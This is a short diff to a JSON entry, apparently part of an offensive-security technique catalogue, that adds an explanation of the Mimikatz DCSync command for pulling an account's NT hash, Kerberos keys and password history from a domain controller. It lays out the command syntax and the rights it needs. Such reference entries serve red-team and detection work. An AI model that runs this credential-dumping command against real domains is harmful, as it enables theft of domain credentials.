@@ -97,5 +97,6 @@
   },
   "tools": [
     "mimikatz"
-  ]
+  ],
+  "explain": "Runs DCSync from Windows with Mimikatz to pull an account's secrets via replication:\n  lsadump::dcsync          impersonate a DC replication partner\n  /domain:<domain>         the target domain\n  /user:<domain>\\<target>  the account whose NT hash, Kerberos keys, and password history to pull\nRequires DCSync rights (Domain Admin or delegated replication rights). No LSASS access on the target is needed."
 }
